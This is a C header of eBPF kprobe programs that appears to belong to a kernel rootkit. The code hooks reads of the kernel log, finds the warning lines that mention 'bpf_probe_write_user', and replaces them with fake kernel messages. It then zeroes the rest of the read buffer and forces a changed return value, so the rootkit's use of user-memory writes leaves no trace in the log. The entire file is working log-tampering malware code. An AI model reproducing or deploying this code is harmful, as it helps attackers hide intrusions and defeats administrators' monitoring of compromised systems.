#ifndef __KMSG_USER_H
#define __KMSG_USER_H

#include <linux/kconfig.h>
#include <linux/ptrace.h>
#include <linux/types.h>
#include <linux/version.h>

#include "include/bpf.h"
#include "include/bpf_helpers.h"

#include "common.h"
#include "hash.h"

#define BPF_PROBE_WRITE_USER_HASH 0xada8e5f3e94cf1f8
#define BPF_GET_PROBE_WRITE_PROTO_HASH 0x55c7edee212d1ef4
#define IS_BPF_STR_HASH(hash) hash == BPF_PROBE_WRITE_USER_HASH || hash == BPF_GET_PROBE_WRITE_PROTO_HASH

#define FAKE_KSMG_NUM 30

SEC("kprobe/fill_with_zero")
int fill_with_zero(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
    if (!file)
        return 0;

    struct rk_fd_key_t fd_key = {
        .fd = file->fd,
        .pid = pid_tgid >> 32,
    };

    struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
    if (!fd_attr)
        return 0;

    const char c = '\0';

#pragma unroll
    for (int i = 0; i != 256; i++)
    {
        if (i == fd_attr->read_size - 1)
            break;
        bpf_probe_write_user(fd_attr->read_buf + i, &c, 1);
    }

    return 0;
}

SEC("kprobe/kmsg")
int kmsg(struct pt_regs *ctx)
{
    int retval = PT_REGS_RC(ctx);

    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
    if (!file)
        return 0;

    struct rk_fd_key_t fd_key = {
        .fd = file->fd,
        .pid = pid_tgid >> 32,
    };

    struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
    if (!fd_attr || !fd_attr->read_buf)
        return 0;

    char buf[128];
    bpf_probe_read(buf, sizeof(buf), fd_attr->read_buf);

    u64 offset = 0, hash = 0;

    // keep timestamp, override only the message content
#pragma unroll
    for (int i = 0; i != 128; i++)
    {
        if (buf[i] == ';' && !offset)
        {
            hash = FNV_BASIS;
            offset = i + 1;
            continue;
        }
        else if (buf[i] == ' ')
        {
            hash = FNV_BASIS;
            continue;
        }
        update_hash_byte(&hash, buf[i]);

        if (IS_BPF_STR_HASH(hash))
            break;
    }

    if (IS_BPF_STR_HASH(hash))
    {
        int key = fd_attr->kmsg % FAKE_KSMG_NUM;
        struct kmsg_t *kmsg = (struct kmsg_t *)bpf_map_lookup_elem(&rk_kmsg, &key);
        if (!kmsg)
            return 0;
        fd_attr->kmsg++;

        bpf_probe_write_user(fd_attr->read_buf + offset, kmsg->str, sizeof(kmsg->str) - 1);

        fd_attr->read_buf += offset + sizeof(kmsg->str) - 1;
        fd_attr->read_size = retval - (offset + sizeof(kmsg->str) - 1);

        fd_attr->action.id |= OVERRIDE_RETURN_ACTION;
        fd_attr->action.return_value = kmsg->size + offset;

        // be sure to override everything
        bpf_tail_call(ctx, &rk_progs, FILL_WITH_ZERO_PROG);
    }
    else 
        fd_attr->action.id &= ~OVERRIDE_RETURN_ACTION;

    return 0;
}

#endif